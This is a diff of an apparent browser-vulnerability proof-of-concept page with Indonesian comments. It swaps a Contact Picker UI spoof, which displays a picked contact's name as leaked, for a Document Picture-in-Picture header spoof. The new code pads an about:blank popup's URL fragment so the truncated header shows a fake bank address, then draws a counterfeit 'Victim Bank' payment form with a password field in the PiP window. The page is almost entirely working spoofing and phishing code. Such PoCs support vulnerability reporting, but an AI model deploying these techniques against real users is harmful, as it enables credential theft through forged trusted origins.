@@ -1,50 +1,61 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Contact Picker UI Spoof PoC</title>
+    <title>Document PiP Header Spoof PoC</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
     <script>
-        async function triggerSpoof() {
-            // 1. Buka halaman penipuan terlebih dahulu (pengguna akan mengira permintaan kontak berasal dari sini)
-            open("https://www.google.com", "PoC", "_blank");
+        // Dua klik: klik pertama membuka popup about:blank#<payload>, klik kedua memicu requestWindow di dalam popup
+        let step = 0;
 
-            try {
-                // 2. Panggil pemilih kontak sistem
-                const contacts = await navigator.contacts.select(["name"], { multiple: false });
-
-                // 3. Penanganan jika pengguna membatalkan pemilihan
-                if (!contacts || contacts.length === 0) {
-                    document.body.innerHTML = '<h1 style="color:orange">Pemilihan dibatalkan atau tidak ada kontak yang dipilih</h1>';
-                    return;
-                }
-
-                // 4. Tampilkan informasi yang bocor
-                const name = contacts[0]["name"] && contacts[0]["name"][0] ? contacts[0]["name"][0] : "(tidak ada nama)";
-                document.body.innerHTML = `
-                    <h1 style="color:red; word-break:break-all;">
-                        Leaked information: ${name}
-                    </h1>
-                `;
-            } catch (e) {
-                // Menangkap error yang mungkin terjadi (misalnya API tidak didukung atau dibatasi izin)
-                document.body.innerHTML = `<h1 style="color:gray;">Picker gagal: ${e.message}</h1>`;
-            }
-        }
-
-        // Pasang listener setelah DOM siap, hindari penempatan onclick di luar body
         document.addEventListener('DOMContentLoaded', () => {
-            document.body.addEventListener('click', triggerSpoof, { once: true });
+            document.body.addEventListener('click', async () => {
+                step++;
+
+                if (step === 1) {
+                    // Klik pertama: buka popup, fragment berisi URL palsu
+                    // about:blank memiliki host kosong, getUrlString() akan fallback ke full spec
+                    // TruncateAt.START membuat header hanya menampilkan …https://victim-bank.com/pay
+                    const payload = '////' + 'a'.repeat(300) + '////https://victim-bank.com/pay';
+                    const popup = window.open('about:blank#' + payload, 'poc', 'width=400,height=400');
+
+                    // Isi popup dengan tombol penipuan (menggunakan DOM API, bukan document.write, agar URL tidak di-reset)
+                    popup.document.body.innerHTML = `
+                        <h1 style="color:#333;">Verifikasi Pembayaran</h1>
+                        <p>Silakan ketuk untuk melanjutkan</p>
+                        <button id="pipBtn" style="padding:20px;font-size:18px;">Konfirmasi</button>
+                    `;
+
+                    // Klik kedua terjadi di dalam popup
+                    popup.document.getElementById('pipBtn').addEventListener('click', async () => {
+                        try {
+                            // Meminta Document PiP (memerlukan gesture pengguna)
+                            const pipWin = await documentPictureInPicture.requestWindow({
+                                width: 220,
+                                height: 300
+                            });
+
+                            // Menulis konten penipuan ke dalam jendela PiP
+                            pipWin.document.body.innerHTML = `
+                                <h2 style="color:red;">Victim Bank</h2>
+                                <p>Verifikasi pembayaran $500.00</p>
+                                <input type="password" placeholder="Kata sandi" style="width:100%;">
+                                <button>Konfirmasi</button>
+                            `;
+                        } catch (e) {
+                            console.log('PiP gagal:', e.message);
+                        }
+                    });
+                }
+            });
         });
     </script>
 </head>
-<body style="margin:0; padding:0;">
+<body style="margin:0;padding:0;">
     <br><br><br>
     <center>
-        <h1>Click anywhere on the page to show the Contact dialog over a cross-origin page!</h1>
-        <p style="color:#666; font-size:14px;">
-            (Berlaku untuk Chrome Android &lt; 149.0.7827.53, memerlukan interaksi pengguna)
-        </p>
+        <h1>Ketuk di mana saja untuk memulai (dua kali)</h1>
+        <p style="color:#666;">Klik pertama: buka popup · Klik kedua: picu PiP</p>
     </center>
 </body>
 </html>
